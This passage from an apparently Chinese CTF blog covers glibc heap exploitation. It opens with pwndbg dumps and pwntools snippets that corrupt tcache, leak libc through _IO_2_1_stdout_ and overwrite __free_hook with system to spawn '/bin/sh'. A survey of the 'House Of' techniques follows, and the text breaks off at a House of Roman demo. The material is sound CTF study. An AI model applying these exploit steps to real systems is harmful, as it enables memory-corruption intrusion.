<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> <span class="comment">// delete(后面有大用处)</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">0</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— ...</span><br><span class="line"><span class="number">0x80</span> [  <span class="number">0</span>]: <span class="number">0x558b1cfcd</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">81</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [<span class="number">52796</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2b0</span> [<span class="number">22705</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2c0</span> [  <span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2e0</span> [<span class="number">53264</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2f0</span> [<span class="number">7420</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x300</span> [<span class="number">21899</span>]: <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd0a0</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd0a0</span></span><br></pre></td></tr></table></figure>
<p>这一块需要先学习 tcache_perthread_struct 结构</p>
<p>下面一段代码需要把两个“add”分开进行理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br></pre></td></tr></table></figure>
<p>第一次申请后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f465c72d9cf</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x55aa705cf060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7f4306d5a6c0</span> (_nl_C_LC_CTYPE+<span class="number">64</span>) ◂— <span class="number">0x7f44f2e09f9a</span> </span><br><span class="line">    <span class="comment">// 这里将有1/16的概率为 _IO_2_1_stdout_</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55aa705cf000</span></span><br><span class="line"><span class="number">0x55aa705cf000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf010</span>:	<span class="number">0x0001000100000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55aa705cf020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf060</span>:	<span class="number">0x000000055aa7043e</span>	<span class="number">0x000055aa705cf010</span></span><br><span class="line"><span class="number">0x55aa705cf070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf0a0</span>:	<span class="number">0x00007f465c72d9cf</span>	<span class="number">0x000055aa705cf060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x55aa705cf0b0</span>:	<span class="number">0x00007f4306d5a6c0</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache(已覆盖)</span></span><br><span class="line"><span class="number">0x55aa705cf0c0</span>:	<span class="number">0x000000055aa705cf</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这次申请的是“0x40的tcache”（写有“0x60的tcache”），输入的是“0x60的tcache”的位置，下一次如果申请的大小为“0x60”就会把“覆盖后的main_arena”申请出来，进行一次写入</p>
<p>第二次申请，就进行了 IO_2_1_stdout leak，通过修改 <code>_IO_2_1_stdout_</code> 的 flag 值，然后当程序调用 puts 输出任意信息时，就会输出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, b<span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, b<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="keyword">delete</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f3e3391980a</span> <span class="comment">// 可以继续覆盖为&quot;free_hook&quot;</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x561aa040a060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">0</span>]: <span class="number">0x708180b3d</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x561aa040a050</span></span><br><span class="line"><span class="number">0x561aa040a050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x561aa040a060</span>:	<span class="number">0x0000000561aa05fb</span>	<span class="number">0x0000561aa040a010</span> <span class="comment">// will be malloc</span></span><br><span class="line"><span class="number">0x561aa040a070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a0a0</span>:	<span class="number">0x00007f3e3391980a</span>	<span class="number">0x0000561aa040a060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0b0</span>:	<span class="number">0x0000000708180b3d</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0c0</span>:	<span class="number">0x0000000561aa040a</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>和上面思路一样，打了 free_hook 就结束了（这个heap排列真的值得我学习）</p>
<hr>
<p><strong>小结：</strong></p>
<p>本题目融合了 tcache perthread corruption，house of roman，IO_2_1_stdout leak，难度有明显上升，因为我之前复现了一道 house of roman 和 IO_2_1_stdout leak 结合的题目，所以爆破这部分比较顺畅</p>
<p>此题目大大加强了我对 tcache 的理解（主要是对“tcache_perthread_struct”的理解），还体验了一波 tcache perthread corruption（刚学tcache时，觉得它的检查很少很简单，现在觉得它的利用也挺麻烦的）</p>
<p>我还学习到了大佬的思路，说实话，大佬对于覆写“tcache_entry”的处理真的让我大开眼界，他对于 unsortedbin 的切割很是讲究，使 main_arena 刚好可以被控制，并且后面“申请tcache”和“覆写main_arena”的配合也是研究过的，没有出现“无main_arena可用”的尴尬（对于 heap 排列，我还是要多多“试错”）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">House Of 系列（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-13 15:35:22 / Modified: 15:40:28" itemprop="dateCreated datePublished" datetime="2022-03-13T15:35:22+08:00">2022-03-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>House Of Spirit 是一种 fastbin attack ，通过利用 free 函数来释放一个 fake chunk，将地址 free 到堆的 bin 链中，然后实现对栈地址的读写实现WAA</p>
<p><strong>保护检查</strong></p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>
</ul>
<p>主要是：当前chunk的size（chunk-&gt;size），和下一个chunk的size（nextchunk-&gt;size）</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以控制 free 的参数，把它改为 fake chunk data addr（House Of Spirit的核心）</li>
<li>可以控制 fake chunk 的 size</li>
<li>可以控制 next chunk 的 size（程序会根据 fake chunk-&gt;size 来获取 next chunk 的位置）</li>
</ul>
<p><strong>利用姿势</strong></p>
<p>现成了两种风格：</p>
<ul>
<li>释放栈中的 fake chunk，劫持 ret 返回地址（利用栈溢出覆盖free的参数）</li>
<li>释放堆中的 fake chunk，劫持控制模块实现WAA（需要注意chunk结构和off-by-one）</li>
</ul>
<p>小技巧：</p>
<ul>
<li>一定要多多关注“可控区域”里的“数字”</li>
<li>注意一些“计数器”</li>
</ul>
<p>用这些现成的“数字”充当 nextchunk-&gt;size 或者 chunk-&gt;size</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查</p>
<p>libc-2.27：多了一个检查，nextchunk-&gt;presize 不为 0（注意 tcache 的影响）</p>
<hr>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><p>house of force 是修改 top chunk size 的一种利用方法 ，利用 top chunk 分割中的漏洞来申请任意 chunk，再通过修改模块进行 GOT劫持，hook劫持</p>
<p>假设这个时候的 top_chunk=0x601200，然后 malloc(0xffe00020)，然后对 malloc 申请的 size 进行检查，<code>0xffe00030 &lt; top_chunk_size</code> ，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br></pre></td></tr></table></figure>
<p>只有 top chunk 的 size 大于等于申请的 size，才会有后续操作</p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 size 字段（篡改为负数或很大值）</li>
<li>用户可以申请任意大小的堆内存（包括负数）</li>
<li>堆溢出，用于修改 top chunk-&gt;size</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出将 top chunk 的 size 字段篡改成 -1（size 就变成了无符号整数中最大的值）</li>
<li>计算偏移，申请大小为该偏移的chunk，把 top chunk 分割到可以修改的目标地址</li>
</ul>
<p>以下公式可以用来计算偏移：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = target_addr - (top_chunk_addr + <span class="number">0x8</span>) <span class="comment"># 64位就改为&quot;+0x10&quot;</span></span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># top_chunk_addr：top chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>注意：offset 通常为负</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：在检查中给chunk添加了一个“范围”（min_address &amp; max_address），限制了申请chunk的地址范围，这样就导致 top chunk 无法分割到目标地址了，House Of Force 失效</p>
<hr>
<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>house of einherjar 跟 house of force 差不多，最终目的都是控制 top chunk 的值，该技术可以强制使得<code>malloc</code>返回一个几乎任意地址的 chunk</p>
<p>通过 off-by-one 把最后一个 chunk 的 pre_inuse 标志位置零，让 free 函数以为上一个 chunk 已经被 free，就会进行后向合并，根据 last chunk-&gt;fake presize 把 top chunk 合并到目标区域</p>
<p>然后下次我们再malloc的时候，返回的地址就是目标地址</p>
<p><strong>保护检查</strong></p>
<p>Unlink 的检测：检查 <strong>“fake chunk-&gt;size”</strong> （必须可以通过 size 索引到“last chunk”，并且P位为“0”，这样才会进行 unlink），因为“fake_size”（offset）很大，fake chunk 会被当做是 large chunk ，所以还会格外检查 <strong>FD，BK，FDsize，BKsize</strong> </p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 presize 字段（篡改为负数或很大值）</li>
<li>有 off-by-one ，可以覆盖 last chunk 的P位为“\x00”（使其在和 top chunk 合并后还可以进行后向合并，通过“chunk-&gt;presize”索引到“fake chunk”把 top chunk 合并到“fake chunk”上）</li>
<li>可以控制“fake chunk”</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>已有两个 chunk（最后一个chunk，和倒数第二个chunk）</li>
<li>在倒数第二个 chunk 的最后一片内存空间（lastchunk-&gt;presize）中写入 offset（可以索引到 fakechunk），同时溢出“\x00”覆盖 lastchunk 的P位（lastchunk-&gt;size）</li>
<li>提前在 fake chunk 处伪造好数据：presize（offset），size，FD，BK，FDsize，BKsize</li>
<li>释放 lastchunk，这样 top chunk 就会转移到该地址</li>
</ul>
<p>以下公式可以用来计算偏移 presize：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = lastchunk_addr - target_addr</span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># lastchunk_addr：last chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>小技巧：</p>
<ul>
<li>控制“fake chunk”，写入“fake_size”，在“FD，BK，FDsize，BKsize”中都写入“fake chunk addr”（target_addr）就可以通过检查（至少在 libc-2.23 是这样的）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基本没有影响，可以通过</p>
<p>libc-2.27：Unlink 对 presize 的检查更为严格了，导致 House Of Einherjar 失效</p>
<hr>
<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h2><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关</p>
<p>它的利用面很小，很容易被其他攻击技术取代</p>
<ul>
<li>House of Lore 可以实现 <strong>分配</strong> 任意指定位置的 chunk，从而修改任意地址的内存</li>
<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
</ul>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure>
<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以构造 small bins（一般程序会用 fastbin，unsortedbin，tcache 很少用smallbin，largebin）</li>
<li>程序可修改 small bins 中 free chunk 的 bk 指针</li>
<li>对应伪造 fake chunk 的区域有一定控制权（可以伪造 fakechunk-&gt;FD 为 victim_chunk）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个 fake chunk（fake chunk 为 stack_buffer_1，还需要一个 stack_buffer_2 来打掩护）</li>
<li>为了绕过检测，设置 stack_buffer_1 的 BK 指针指向 stack_buffer_2，设置 stack_buffer_2 的 FD 指针指向 stack_buffer_1</li>
<li>接下来先 malloc 一个chunk，防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中  </li>
<li>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中</li>
<li>在 victim chunk 的BK指针中写入fake chunk（small bin是基于BK，从后向前申请的）</li>
<li>再次申请 victim chunk（同时 fake chunk 进入small bin），最后申请 fake chunk </li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：基础检查，还需要绕过 cache</p>
<p>libc-2.31：House Of Lore 已经失效</p>
<hr>
<h2 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h2><p>House Of Orange 核心就是通过漏洞利用获得 free 的效果 </p>
<p>这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p>
<p>后续可以配合 unsorted bin attack 和 FSOP 获取 shell</p>
<p><strong>利用条件</strong></p>
<ul>
<li>有堆溢出，可以修改 top chunk size</li>
<li>可以申请较大的空间</li>
<li>没有释放模块（看见程序没有 free，realloc等函数时，优先考虑打House Of Orange）</li>
</ul>
<p>伪造的 top chunk size 的要求 ：</p>
<ul>
<li>0x0fe1、0x1fe1、0x2fe1、0x3fe</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出修改 top chunk size为“0x0fe1”</li>
<li>申请“0x2000”的空间</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：可用打通</p>
<p>libc-2.24：增加了 vtable check，但仍然可以绕过</p>
<p>libc-2.27：完全失效</p>
<hr>
<h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House Of Rabbit"></a>House Of Rabbit</h2><p>House Of Rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中</p>
<ul>
<li>缺点：条件过多并且有替代选项（unlink攻击，Double free等等）</li>
<li>优点：对 libc 版本的“抵抗力”很强，高 libc 版本也可以打</li>
</ul>
<p>核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化</p>
<p><strong>利用条件</strong></p>
<ul>
<li>修改fastbin chunk的大小（感觉和unlink条件差不多，效果也差不多）<ul>
<li>堆溢出（有时off-by-one也利用），可以覆盖 nextchunk-&gt;size</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
<li>修改FD指针（这种情况不用考虑，因为可以打 Double free，除非特殊情况）<ul>
<li>有修改模块，并且有UAF（可以修改 free chunk）</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>修改fastbin chunk的大小：直接构造 overlap chunk，通过 fastbin consolidate 使其合法化</li>
<li>修改FD指针：让 chunk-&gt;FD 指向一个 fake chunk，触发 fastbin consolidate 之后让这个 fake chunk 成为一个合法的 chunk（注意一下fake chunk的排列，不然会在consolidate时报错）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>经测试：libc-2.23 ~ libc-2.31 都可以打通</p>
<hr>
<h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
<p>当程序没法泄露 libc_base 时，就会优先考虑 House Of Roman</p>
<p><strong>利用条件</strong></p>
<ul>
<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
</ul>
<p><strong>版本影响</strong></p>
<p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
<p>libc-2.27：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
</ul>
<p>libc-2.29：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Roman-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-13 15:20:46" itemprop="dateCreated datePublished" datetime="2022-03-13T15:20:46+08:00">2022-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:42:24" itemprop="dateModified" datetime="2022-04-06T14:42:24+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
<ul>
<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
</ul>
<hr>
<h2 id="House-Of-Roman-利用姿势"><a href="#House-Of-Roman-利用姿势" class="headerlink" title="House Of Roman 利用姿势"></a>House Of Roman 利用姿势</h2><p><strong>外国老哥给了一个 demo：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span 